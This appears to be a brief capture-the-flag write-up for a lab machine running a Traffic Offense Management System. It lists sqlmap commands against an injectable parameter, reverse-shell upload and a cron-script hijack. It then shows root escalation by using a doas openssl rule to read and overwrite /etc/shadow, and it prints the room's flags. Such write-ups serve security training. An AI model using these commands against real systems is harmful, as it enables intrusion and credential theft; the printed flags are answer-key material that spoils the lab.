# Plotted_TMS 

> VOiD | Sunday 20 February 2022 05:10:05 PM UTC

My IP : 10.8.253.221
Target IP : 10.10.47.219



## PORT 445 [http - Apache]
```bash
http://10.10.47.219:445/management/
Traffic Offense Management System


http://10.10.47.219:445/management/admin/?page=drivers/manage_driver&id=4  <<-- sql here

Using sqlmap with dump database
sqlmap -u "http://10.10.47.219:445/management/admin/?page=drivers/manage_driver&id=4" --cookie="PHPSESSIONID=dd6tfb5apnerhqpc57nbr69qla" 

sqlmap -u "http://10.10.47.219:445/management/admin/?page=drivers/manage_driver&id=4" --cookie="PHPSESSIONID=dd6tfb5apnerhqpc57nbr69qla" --batch --dbs

http://10.10.47.219:445/management/admin/?page=system_info

upload php revshell and then enjoy
```

## USER [www-data]
```bash
* * 	* * *	plot_admin /var/www/scripts/backup.sh

mv backup.sh backup.sh.bak
echo revshell > backup.sh

lets wait

we have doas as suid

www-data@plotted:/home/plot_admin$ cat /etc/doas.conf
permit nopass plot_admin as root cmd openssl


```


## USER [plot_admin]
```bash

plot_admin@plotted:~$ cat user.txt 
77927510d5edacea1f9e86602f1fbadb


doas openssl enc -in "/etc/shadow"	> shadow

doas openssl enc -in "./sh" -out "/etc/shadow"

root@plotted:~# cat root.txt 
Congratulations on completing this room!

53f85e2da3e874426fa059040a9bdcab

Hope you enjoyed the journey!

Do let me know if you have any ideas/suggestions for future rooms.
-sa.infinity8888
```